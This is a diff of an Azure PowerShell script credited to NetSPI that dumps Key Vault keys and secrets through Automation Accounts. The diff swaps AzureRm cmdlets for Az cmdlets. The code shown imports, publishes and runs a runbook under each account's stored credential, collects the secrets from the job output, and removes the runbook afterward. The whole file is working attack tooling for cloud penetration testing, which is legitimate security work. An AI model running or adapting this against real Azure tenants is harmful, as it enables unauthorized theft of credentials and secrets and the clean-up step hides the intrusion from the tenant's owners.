@@ -1,4 +1,4 @@
-﻿<#
+<#
     File: Get-AzureKeyVaults-Automation.ps1
     Author: Karl Fosaaen (@kfosaaen), NetSPI - 2019
     Description: PowerShell function for dumping Azure Key Vault Keys and Secrets via Automation Accounts.
@@ -71,21 +71,21 @@ Function Get-AzureKeyVaults-Automation
     )
 
     # Check to see if we're logged in
-    $LoginStatus = Get-AzureRmContext
+    $LoginStatus = Get-AzContext
     $accountName = $LoginStatus.Account
     if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
-        try {Login-AzureRmAccount -ErrorAction Stop}
+        try {Login-AzAccount -ErrorAction Stop}
         catch{Write-Warning "Login process failed."}
         }
     else{}
 
     # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzureRmSubscription"
     if ($Subscription){        
-        Select-AzureRmSubscription -SubscriptionName $Subscription | Out-Null
+        Select-AzSubscription -Subscription $Subscription | Out-Null
     }
     else{
         # List subscriptions, pipe out to gridview selection
-        $Subscriptions = Get-AzureRmSubscription -WarningAction SilentlyContinue
+        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
         foreach ($sub in $subChoice) {Get-AzureKeyVaults-Automation -Subscription $sub -ExportCerts $ExportCerts -CertificatePassword $CertificatePassword}
         break
@@ -103,7 +103,7 @@ Function Get-AzureKeyVaults-Automation
     
     # Get a list of Automation Accounts
     Write-Verbose "Getting List of Azure Automation Accounts..."
-    $AutoAccounts = Get-AzureRmAutomationAccount | out-gridview -Title "Select One or More Automation Accounts" -PassThru    
+    $AutoAccounts = Get-AzAutomationAccount | out-gridview -Title "Select One or More Automation Accounts" -PassThru    
     foreach ($AutoAccount in $AutoAccounts){
         # Set name of Automation Account
         $verboseName = $AutoAccount.AutomationAccountName
@@ -113,7 +113,7 @@ Function Get-AzureKeyVaults-Automation
         # If the runbook doesn't exist, don't run it
         if (Test-Path $PSScriptRoot\Misc\KeyVaultRunBook.ps1 -PathType Leaf){
                 
-            $autoCredName = (Get-AzureRmAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $verboseName).Name
+            $autoCredName = (Get-AzAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $verboseName).Name
 
             # Overwrite the TEMPLATECREDENTIAL in the runbook
             if($autoCredName){
@@ -145,26 +145,26 @@ Function Get-AzureKeyVaults-Automation
                 Write-Verbose "`tGetting getting available Key Vault Keys/Secrets using the $verboseName Automation Account, $jobToRunCredential Credential, and the $jobToRunName.ps1 Runbook"
                 try{
                     # Import the Runbook
-                    Import-AzureRmAutomationRunbook -Path $pwd\$jobToRunName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRunName | Out-Null
+                    Import-AzAutomationRunbook -Path $pwd\$jobToRunName.ps1 -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRunName | Out-Null
 
                     # Publish the Runbook
-                    Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRunName | Out-Null
+                    Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Name $jobToRunName | Out-Null
 
                     # Run the Runbook and get the job id
-                    $jobID = Start-AzureRmAutomationRunbook -Name $jobToRunName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+                    $jobID = Start-AzAutomationRunbook -Name $jobToRunName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
 
-                    $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                    $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
 
                     # Wait for the job to complete
                     Write-Verbose "`t`tWaiting for the automation job to complete"
                     while($jobstatus.Status -ne "Completed"){
-                        $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                     }    
 
                     # If there was actual data here, get the output and add it to the table                    
                     try{
                         # Get the output
-                        $jobOutput = Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzureRmAutomationJobOutputRecord | Select-Object -ExpandProperty Value
+                        $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
 
                         if ($jobOutput.Values -ne $null){
                             # Write Keys/Secrets to the table
@@ -195,7 +195,7 @@ Function Get-AzureKeyVaults-Automation
 
                     # Clean up
                     Write-Verbose "`t`tRemoving $jobToRunName runbook from $verboseName Automation Account"
-                    Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRunName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
+                    Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRunName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                 }
                 Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
 
